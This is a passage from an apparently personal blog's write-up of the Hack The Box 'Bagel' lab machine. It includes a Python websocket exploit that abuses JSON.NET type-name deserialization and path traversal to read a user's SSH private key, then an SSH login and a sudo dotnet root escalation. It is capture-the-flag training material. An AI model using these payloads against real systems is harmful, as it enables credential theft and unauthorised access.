+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We are telling the RemoveOrder object that now it will be a File type and should perform the action ReadFile. Since the TypeNameHandler was set to 4, we are allowed to do that and once the object is de-serialized it will perform the action.
+The exploit code is this one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> websocket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws <span style="color:#f92672">=</span> websocket<span style="color:#f92672">.</span>WebSocket()
+</span></span><span style="display:flex;"><span>ws<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#34;ws://bagel.htb:5000/&#34;</span>) <span style="color:#75715e"># connect to order app</span>
+</span></span><span style="display:flex;"><span>order <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;RemoveOrder&#34;</span>: {<span style="color:#e6db74">&#34;$type&#34;</span>: <span style="color:#e6db74">&#34;bagel_server.File, bagel&#34;</span>, <span style="color:#e6db74">&#34;ReadFile&#34;</span>:<span style="color:#e6db74">&#34;../../../../home/phil/.ssh/id_rsa&#34;</span>}}
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> str(json<span style="color:#f92672">.</span>dumps(order))
+</span></span><span style="display:flex;"><span>ws<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>print(json<span style="color:#f92672">.</span>loads(result))
+</span></span></code></pre></div><p>This will print out the private SSH key. We just have to include it on a file, give to it the permission 600 and then, connect through SSH with the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i key phil@bagel.htb
+</span></span></code></pre></div><p>And this will give us access to the machine, where we can see the user.txt</p>
+<p><img src="/img/machines/bagel/user.webp" alt=""></p>
+<hr>
+<h3 id="root">
+  Root
+  <a href="#root" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Time to PrivEsc! First of all, let’s see if we can run any command as sudo:</p>
+<p><img src="/img/machines/bagel/sudo-l.webp" alt=""></p>
+<p>Seems that we can’t run anything as sudo with this user…
+Remember that on the passwd file we found out that the existing users where phil and developer. We have the credentials of developer, if you took a look at the files of the .dll you surely saw those ones.</p>
+<p><img src="/img/machines/bagel/sqlcreds.webp" alt=""></p>
+<p><img src="/img/machines/bagel/userdev.webp" alt=""></p>
+<p>It appears to work, so let’s see if we can run anything as root.</p>
+<p><img src="/img/machines/bagel/sudo-l2.webp" alt=""></p>
+<p>So indeed we can run dotnet as sudo. <em>gtfobins</em> has <a href="https://gtfobins.github.io/gtfobins/dotnet/">this</a> entry where they show how we can gain root access with dotnet. Following the steps gives us root access.</p>
+<p><img src="/img/machines/bagel/root.webp" alt=""></p>
+<hr>
+<h2 id="conclusion">
+  Conclusion
+  <a href="#conclusion" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>That was a really really fun machine to solve. I really enjoyed it and learned a lot of new things. With no doubt one of my favorites.</p>
+
+    </div>
+    
+      
+    
+
+    
+      
+        
+
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">Alex Rodriguez</div>
+      
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
